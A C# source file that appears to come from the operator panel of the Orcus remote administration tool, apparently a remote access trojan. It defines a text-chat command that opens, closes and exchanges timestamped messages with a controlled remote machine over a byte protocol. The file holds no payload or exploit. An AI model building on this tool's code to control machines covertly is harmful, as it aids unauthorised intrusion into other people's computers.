using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.TextChat;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.TextChat
{
    [DescribeCommandByEnum(typeof (TextChatCommunication))]
    public class TextChatCommand : Command
    {
        public bool IsStarted { get; private set; }

        public event EventHandler<ChatMessage> NewMessageReceived;
        public event EventHandler ChatStatusChanged;
        public event EventHandler ChatInitalizationFailed;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((TextChatCommunication) parameter[0])
            {
                case TextChatCommunication.ChatOpened:
                    IsStarted = true;
                    ChatStatusChanged?.Invoke(this, EventArgs.Empty);
                    LogService.Receive((string) Application.Current.Resources["ChatOpened"]);
                    break;
                case TextChatCommunication.ChatClosed:
                    IsStarted = false;
                    ChatStatusChanged?.Invoke(this, EventArgs.Empty);
                    LogService.Warn((string) Application.Current.Resources["ChatClosed"]);
                    break;
                case TextChatCommunication.ResponseMessage:
                    NewMessageReceived?.Invoke(this,
                        new ChatMessage
                        {
                            Content = Encoding.UTF8.GetString(parameter, 9, parameter.Length - 9),
                            Timestamp = new DateTime(BitConverter.ToInt64(parameter, 1)).ToLocalTime()
                        });
                    break;
                case TextChatCommunication.InitializationFailed:
                    ChatInitalizationFailed?.Invoke(this, EventArgs.Empty);
                    LogService.Error((string) Application.Current.Resources["ChatInitializationFailed"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void Close()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) TextChatCommunication.Close});
            LogService.Send((string) Application.Current.Resources["StopChat"]);
        }

        public void SendMessage(string message)
        {
            if (!IsStarted)
                return;

            var data = new List<byte> {(byte) TextChatCommunication.SendMessage};
            data.AddRange(BitConverter.GetBytes(DateTime.Now.Ticks));
            data.AddRange(Encoding.UTF8.GetBytes(message));
            ConnectionInfo.SendCommand(this, data.ToArray());
        }

        public void StartChat(ChatSettings chatSettings)
        {
            if (IsStarted)
                return;

            var data = new List<byte> {(byte) TextChatCommunication.OpenChat};
            data.AddRange(new Serializer(typeof (ChatSettings)).Serialize(chatSettings));
            ConnectionInfo.SendCommand(this, data.ToArray());
            LogService.Send((string) Application.Current.Resources["StartChat"]);
        }

        protected override uint GetId()
        {
            return 21;
        }
    }
}